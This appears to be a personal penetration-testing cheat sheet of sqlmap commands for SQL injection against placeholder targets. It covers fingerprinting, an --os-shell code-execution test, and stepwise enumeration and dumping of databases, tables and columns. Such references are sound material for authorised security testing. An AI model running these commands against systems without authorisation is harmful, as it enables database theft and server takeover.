
![[481285.jpg]]


> [!info] Method 1
>```sql
> sqlmap -u "<url>"
>```
> ```sql
> sqlmap -u "<url>" --fingerprint --random-agent
> ```
>```sql
> sqlmap -u "<url>" --threads=3 --banner --random-agent
> ```
> Test For Remote Code Execution
>```
>sqlmap -u "<url>" --os-shell
>```

> [!Success]  Method 2
> Fuzzing query Testing
>```sql
>sqlmap -r request.txt -p inputvartoFUZZ --random-agent
>```
> Specify Some Technique
> ```sql
> -- Boolian based (Blind)
> -- UNION based
> -- Stacked Queries
> -- Time Based (Blind)
> -- Inline Queries
> sqlmap -r request.txt -p inputvartoFUZZ --random-agent --technique=BUSTEQ..
>```
>Return All Databases
>```sql
>sqlmap -r request.txt -p inputvartoFUZZ --dbs --batch --random-agent
>```

> [!danger] Step To Extraction Data
> Extract All DataBases
>```sql
>sqlmap -r request.txt -p inputvartoFUZZ --dbs --batch --random-agent
>```
> Extract Current Database
> ```sql
>sqlmap -r request.txt -p inputvartoFUZZ --random-agent --technique=E --current-db
> ```
> Extract Current User Database
> ```sql
>sqlmap -r request.txt -p inputvartoFUZZ --random-agent --technique=E --current-user
> ```
> Extract Tables From Database
> ```sql
>sqlmap -r request.txt -p inputvartoFUZZ --technique=E -D databasename --tables --batch
> ```
> Extract columns from tables
> ```sql
> sqlmap -r request.txt -p inputvartoFUZZ --technique=E -D databasename -T tablename --columns
> ```
> dump table
>```sql
>sqlmap -r request.txt -p inputvartoFUZZ --technique=E -D databasename -T tablename --dump
>```
>dump columns 
>```sql
>sqlmap -r request.txt -p inputvartoFUZZ --technique=E -D databasename -T tablename --columns --dump
>```

> [!warning] sqlmap proxy with brup
>```sql
>sqlmap -r request.txt -p inputvartoFUZZ --dbs --batch --random-agent --proxy http://127.0.0.1:8080
>```
